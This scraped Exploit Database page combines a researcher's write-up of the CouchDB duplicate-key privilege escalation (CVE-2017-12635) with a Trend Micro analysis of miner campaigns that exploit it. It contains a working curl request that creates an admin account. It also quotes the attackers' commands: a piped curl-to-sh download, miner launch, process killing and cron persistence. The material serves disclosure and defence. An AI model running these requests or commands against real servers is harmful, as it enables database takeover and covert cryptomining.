##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Remote Code Execution in CouchDB

Nov 14, 2017

tl;dr There was a vulnerability in CouchDB caused by a discrepancy between the database’s native JSON parser and the Javascript JSON parser used during document validation. Because CouchDB databases are meant to be exposed directly to the internet, this enabled privilege escalation, and ultimately remote code execution, on a large number of installations. ~~If it had been exploited, this bug could have allowed for the modification of arbitrary packages in the [npm registry](https://registry.npmjs.org/).~~ *[edit: I’m wrong, and the main npm registry is unaffected. See correction below. My bad!]* [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

## Background

Last time, I wrote about a deserialization bug leading to [code execution on rubygems.org](/security/2017/10/07/rubygems-org-rce.html), a repository of dependencies for ruby programs. The ability to inject malware into upstream project dependencies is a scary attack vector, and one from which I doubt most organizations are adequately protected.

With this in mind, I started searching for bugs in [registry.npmjs.org](https://registry.npmjs.org/), the server responsible for distributing npm packages. According to [their homepage](https://www.npmjs.com/), the npm registry serves more than 3 billion (!) package downloads per week.

## CouchDB

The npm registry uses CouchDB, which I hadn’t heard of before this project. The basic idea is that it’s a “NoSQL” database that makes data replication very easy. It’s sort of like a big key-value store for JSON blobs (“documents”), with features for data validation, querying, and user authentication, making it closer to a full-fledged database. CouchDB is written in Erlang, but allows users to specify document validation scripts in Javascript. These scripts are automatically evaluated when a document is created or updated. They start in a new process, and are passed JSON-serialized documents from the Erlang side.

CouchDB manages user accounts through a special database called `_users`. When you create or modify a user in a CouchDB database (usually by doing a `PUT` to `/_users/org.couchdb.user:your_username`), the server checks your proposed change with a Javascript `validate_doc_update` function to ensure that you’re not, for example, attempting to make yourself an administrator.

## Vulnerability

The problem is that there is a discrepancy between the Javascript JSON parser (used in validation scripts) and the one used internally by CouchDB, called [jiffy](https://github.com/apache/couchdb-jiffy). Check out how each one deals with duplicate keys on an object like `{"foo":"bar", "foo":"baz"}`:

Erlang:

```
> jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}").
{[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}
```

Javascript:

```
> JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
{foo: "baz"}
```

For a given key, the Erlang parser will store both values, but the Javascript parser will only store the last one. Unfortunately, the getter function for CouchDB’s internal representation of the data will only return the *first* value:

```
% Within couch_util:get_value
lists:keysearch(Key, 1, List).
```

And so, we can bypass all of the relevant input validation and create an admin user thusly:

```
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops'
--data-binary '{
  "type": "user",
  "name": "oops",
  "roles": ["_admin"],
  "roles": [],
  "password": "password"
}'

```

In Erlang land, we’ll see ourselves as having the `_admin` role, while in Javascript land we appear to have no special permissions. Fortunately for the attacker, almost all of the important logic concerning authentication and authorization, aside from the input validation script, occurs the Erlang part of CouchDB.

Now that we have an administrator account, we have complete control of the database. Getting a shell from here is usually easy since CouchDB lets you define custom `query_server` languages through the admin interface, a feature which is basically just a wrapper around `execv`. One funny feature of this exploit is that it’s slightly tricky to detect through the web GUI; if you try to examine the user we just created through the admin console, the `roles` field will show up empty since it’s parsed in Javascript before being displayed!

## Impact on npm

I’ve been trying to figure out exactly how npm was affected by this bug. Since I didn’t actually exploit the vulnerability against any of npm’s production servers, I have to make educated guesses about which parts of the infrastructure were vulnerable to which parts of the attack, based on publicly available information.

~~I am almost certain that [registry.npmjs.org](https://registry.npmjs.org) was vulnerable to the privilege escalation/admin account creation part of this attack, which would have allowed an attacker to modify packages. This is because user creation on npm is more or less identical to the vanilla CouchDB user creation flow. Then, after authenticating as our newly created admin user, the user context passed to subsequent validation scripts will have the `_admin` role visible, allowing us to pass the [`isAdmin` check in one of the registry’s validation docs](https://github.com/npm/npm-registry-couchapp/blob/6736cbb4c27007861d02d18911f48656675c3f98/registry/validate_doc_update.js#L271). That said, as far as I can tell [from what’s on Github](https://github.com/npm/npm-registry-couchapp/blob/6736cbb4c27007861d02d18911f48656675c3f98/registry/rewrites.js), their production server doesn’t provide a route to the administrator’s configuration API, meaning I’m not sure if the bug could have enabled RCE on that server.~~ *[edit: It turns out that [registry.npmjs.org](https://registry.npmjs.org) simply exposes an identical API to the CouchDB user creation flow in order to maintain backwards compatibility with old clients. It has been using a [custom authentication system since early 2015](http://blog.npmjs.org/post/167524001790/couchdb-vulnerabilities-and-the-npm-registry), and is therefore not vulnerable to my attack. The skim database mentioned below was affected by the bug, however. I apologize for being completely wrong in the initial version of this blog post!]*

Npm also exposes a [“skim database”](https://skimdb.npmjs.com/) which *does* look like it would have been vulnerable to the RCE part of the attack, but it’s unclear to me how that database is used in the infrastructure today. There’s a [blog post from 2014](http://blog.npmjs.org/post/75707294465/new-npm-registry-architecture) which indicates that all writes go to the skimdb, but I don’t know if this is still true.

## Conclusion

It’s probably a bad idea to use more than one parser to process the same data. If you have to, perhaps because your project uses multiple languages like in CouchDB, do your best to ensure that there aren’t any functional differences between the parsers like there were here. It’s unfortunate that the JSON standard [does not specify the behavior of duplicate keys](https://stackoverflow.com/questions/21832701/does-json-syntax-allow-duplicate-keys-in-an-object/21833017#21833017).

Thanks to the CouchDB team for having a published security@ email address and working quickly to get this fixed.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Attacks abusing cryptocurrency miners [have been on an upswing](https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/security-101-the-impact-of-cryptocurrency-mining-malware) — in large part due to the growing popularity of digital currencies. Based on data from our sensors that we deployed worldwide, we have observed a new attack that exploits two vulnerabilities in a popular database system to deliver miners (detected by Trend Micro as HKTL\_COINMINE.GE, HKTL\_COINMINE.GP, and HKTL\_COINMINE.GQ) for the Monero cryptocurrency. In this instance, Apache CouchDB — an open source database management system designed to combine scalable architecture with an easy-to-use interface — is being targeted.

The [two vulnerabilities](https://blog.couchdb.org/2017/11/14/apache-couchdb-cve-2017-12635-and-cve-2017-12636/) that we found being exploited are as follows:

* Apache CouchDB JSON Remote Privilege Escalation Vulnerability (CVE-2017-12635)
* Apache CouchDB \_config Command Execution (CVE-2017-12636)

Due to differences in CouchDB’s parsers, exploitation of these vulnerabilities can provide attackers with duplicate keys that allow them access control — including administrator rights — within the system. The attackers can then use these functions to execute arbitrary code.

These vulnerabilities were [patched](http://www.securityweek.com/critical-vulnerabilities-patched-apache-couchdb) back in November 2017.

By default, CouchDB listens to port 5984/TCP. According to our sensors, the peak periods of malicious activity occurred in early February:

*Figure 1. Chart showing the detection of potential attacks; early February was when the peaks occurred*

Based on the packet traces below, CVE-2017-12635 is first exploited to configure a CouchDB account that has administrator abilities.

*Figure 2. Packet traces we found that show exploitation of CVE-2017-12635*

The administrator account is then used for authentication to exploit the remote command execution vulnerability CVE-2017-12636:

[![](/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/02/CouchDB-3-2-2.jpg)](/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/02/CouchDB-3-2-2.jpg)

*Figure 3. Exploitation of CVE-2017-12636 using the account with administrative rights*

In this scenario, the authorization dG9wa2VrMTEyOnRvcGtlazExMg== can be decoded using base64 to the following credentials:

* Username: topkek112
* Password: topkek112

The string Y3VybCBodHRwOi8vOTQuMjUwLjI1My4xNzgvbG9nbzYuanBnfHNo can be decoded using base 64 to a one-liner:

* curl hxxp://94.250[.]253[.]178/logo6[.]jpg|sh

This will download logo6.jpg, which is actually a Bourne shell script that does several actions.

First, it secures the compromised device by killing possible competing mining activities to ensure that the malware is the only cryptocurrency miner in the system. Some examples include the following:

* pkill -f minergate
* pkill -f minergate-cli

It also downloads and executes the cryptomining executable and configuration:

* wget -O /var/tmp/vpz http://94[.]250[.]253[.]178/yam
* · chmod 777 /var/tmp/vpz
* · cd /var/tmp
* · nohup ./vpz -c x -M stratum+tcp://xim4:x@178[.]170[.]189[.]193:82 >/dev/null &

Furthermore, it keeps persistence on the device by installing scheduled cron jobs

* echo "\* \* \* \* \* wget -q http://94[.]250[.]253[.]178/logo6[.]jpg -O - | sh" >> /tmp/cron || true && crontab /tmp/cron
* **Vulnerabilities as a Gateway to Cryptocurrency Mining**

Cryptocurrencies have taken center stage recently, as prices hit both highs and lows: [Bitcoin](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/bitcoin) peaked at US$20,000 in December 2017 and dropped below US$6,000 just over a month later. And they haven’t been gaining attention from mainstream media and users alone — cybercriminals have also taken notice, seeing cryptocurrency mining as a potentially lucrative income source.

This has resulted in the increase of attacks meant to mine cryptocurrencies. What’s more, many of the victims are unaware that their resources are being used, as device slowdowns and sluggishness can often be attributed to causes other than malware or vulnerability exploitation.

Typically, cryptocurrency mining uses a significant amount of computational power and hardware resources to be successful. Due to the difficulty of mining, many attackers try to exploit flaws and vulnerabilities in organizations — where resources are plentiful — to harness their systems and devices.

CouchDB is relatively popular — it ranked [28th out of 300](https://db-engines.com/en/ranking) according to DB-engines rankings of database management systems — and is used by some larger organizations, [notably the British Broadcasting Corporation](http://www.erlang-factory.com/conference/London2009/speakers/endafarrell) (BBC) for their content platforms. This means that attackers have access to a fairly large active source of resources for their mining operations. However, in our view, the system being targeted is not as important as the existence of vulnerabilities that can be exploited. It does not really matter whether it is CouchDB or other database systems such as MongoDB. As long as there's a chance to exploit an RCE (remote code execution), the threat actors will take advantage of it. The impact of an RCE vulnerability is that malicious elements run whatever code they want remotely. In this case, an attack using a cryptocurrency miner is a low-risk, potentially high-reward one. As for why CouchDB was targeted, we can surmise that it is due to the existence of the vulnerabilities rather than any special feature that the system provides.

**Mitigation and Prevention**

Cryptocurrency miners not only can compromise system performance but also open up organizations and users to a plethora of potential problems, from information theft to even more malware.

Fortunately, the impact of many of these miners can be mitigated through relatively simple steps that are part of standard security best practices.

* Regularly updating devices with the latest patches can help prevent attacks that exploit vulnerabilities. This is especially applicable in this case.
* Changing the device’s default credentials and using strong credentials can prevent unauthorized access.
* For users with home routers, enabling firewalls and using available intrusion detection and prevention systems can also prevent attackers from entering a device or network.
* For IT professionals, [application whitelisting](/en_us/business/products/user-protection/sps/endpoint.html) and other similar security features can help detect suspicious activity and prevent suspicious executables from running or installing.
